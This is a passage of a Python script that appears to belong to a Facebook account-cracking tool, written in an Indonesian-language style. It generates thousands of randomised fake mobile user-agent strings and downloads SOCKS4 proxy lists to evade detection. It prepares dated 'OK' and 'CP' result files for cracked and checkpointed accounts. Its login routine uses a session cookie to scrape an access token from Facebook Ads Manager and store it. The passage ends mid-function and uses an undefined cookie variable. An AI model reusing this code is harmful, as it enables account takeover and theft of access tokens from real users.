ua = ['Mozilla/5.0 (Linux; Android 11; Infinix X689F Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/325.0.1.4.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; V2028 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]',]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104",]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-M325FV Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-M325F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A225M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/364.0.0.14.77;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/257.0.0.44.118;]',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 7; Walton orbit y50 Build/PPR1.254165.367) [FBAN/FB4A;FBAV/324.0.0.43306;FBBV/824413952;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_FI;FBMF/Orbit Y50;FBBD/Orbit Y50;FBDV/Walton orbit y50;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720,height=1520};FB_FW/1;]',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.1.1; de-de; ENERGY i10 DUAL Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A551 Safari/8536.25 GDApple/0.0.0 QuantcastSDK/iOS_1.5.3/1a33em6z8w476mog-ugyz0qbpkepdnehu',]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]'
    uaku0=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku0)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/356.0.0.7.89;]'
    uaku9=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku9)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]'
    uaku8=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku8)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]'
    uakut=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uakut)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/bg_BG;FBAV/222.0.0.10.118;]'
    uaku7=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku7)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/bg_BG;FBAV/222.0.0.10.118;]'
    uaku6=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku6)
  
  
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/bg_BG;FBAV/222.0.0.10.118;]'
    uaku5=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku5)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
    uaku4=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku4)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/349.0.0.8.103;]'
    uaku3=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku3)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='Infinix X662 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]'
    uak=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uak)
    
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]'
    uaku=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku)
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
	b=random.choice(['4','5','6','7','8','9','10','11','12'])
	c='ASUS_I006D Build/RKQ1.201022.002'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Sleipnir/3.5.28'
	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uakua)

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='LE2113 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)


   
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='LE2113 Build/RKQ1.201105.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
 
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='M2010J19CG Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]'
    uak=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uak)

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
    uaku=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku)

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3201 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
def uaku():
    try:
        ua=open('Ua.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Cyber-Mafia-Team/Control-Room-Center/blob/main/Ua.txt').text
        ua=open('Ua.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('Ua.txt','r').read().splitlines()
 
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[] 
#------------[ COLOR CODE ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ LOGO-LAKNAT ]-----------------#

logo =""" 
Solved This
""" 

os.system('clear')
print(logo)
sound =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
pass
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=========================================================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
